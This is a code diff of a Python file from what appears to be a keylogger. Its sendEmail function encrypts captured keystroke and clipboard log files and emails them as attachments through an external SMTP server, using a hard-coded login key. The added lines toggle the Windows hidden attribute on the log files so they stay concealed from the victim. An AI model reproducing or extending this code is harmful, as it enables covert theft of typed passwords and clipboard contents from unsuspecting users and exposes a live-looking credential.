@@ -7,6 +7,16 @@ from encryption import encryptContents
 
 def sendEmail():
     print("sending")
+
+    if os.path.exists("logs.txt"):
+        print("here")
+        os.system(f'attrib -h "{"logs.txt"}"')
+    if os.path.exists("clipBoardLogs.txt"):
+        print("here")
+
+        os.system(f'attrib -h "{"clipBoardLogs.txt"}"')
+
+
     log_file = encryptContents("logs.txt")
     print(log_file)
     clipBoard_file = encryptContents("clipBoardLogs.txt")
@@ -20,6 +30,12 @@ def sendEmail():
     message["To"] = receiver
     message.set_content("Please find the logs attached.")
     try:
+
+        if os.path.exists("logs.bin"):
+            os.system(f'attrib -h "{"logs.bin"}"')
+        if os.path.exists("clipBoardLogs.bin"):
+            os.system(f'attrib -h "{"clipBoardLogs.bin"}"')
+
         with open(log_file, "rb") as file:
             fileData = file.read()
             message.add_attachment(fileData, maintype="text", subtype="plain", filename="logs.txt")
@@ -27,30 +43,32 @@ def sendEmail():
             clipBoardFileData = clipBoardFile.read()
             message.add_attachment(clipBoardFileData, maintype="text", subtype="plain", filename="clipBoardLogs.txt")
 
+        if os.path.exists("logs.bin"):
+            os.system(f'attrib +h "{"logs.bin"}"')
+        if os.path.exists("clipBoardLogs.bin"):
+            os.system(f'attrib +h "{"clipBoardLogs.bin"}"')
+
         with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
             server.starttls()
             server.login("api", "c2151af737bd447f8f82331e58edbda8")
             server.send_message(message)
         print("Email sent successfully!")
-        
+    
+
+
+
+
     except smtplib.SMTPDataError as e:
         print("SMTP Data Error:", e)
     except smtplib.SMTPException as e:
         print("SMTP Error:", e)
     except Exception as e:
         print("General Error:", e)
-
-    # if os.path.exists("logs.txt"):
-    #     ctypes.windll.kernel32.SetFileAttributesW("logs.txt", 0x02)
-    # if os.path.exists("clipBoardLogs.txt"):
-    #     ctypes.windll.kernel32.SetFileAttributesW("clipBoardLogs.txt", 0x02)
-    # if os.path.exists("logs.bin"):
-    #     ctypes.windll.kernel32.SetFileAttributesW("logs.bin", 0x02)
-    # if os.path.exists("clipBoardLogs.bin"):
-    #     ctypes.windll.kernel32.SetFileAttributesW("clipBoardLogs.bin", 0x02)
+    
 
 if __name__ == "__main__":
     sendEmail()
+
     
 
 
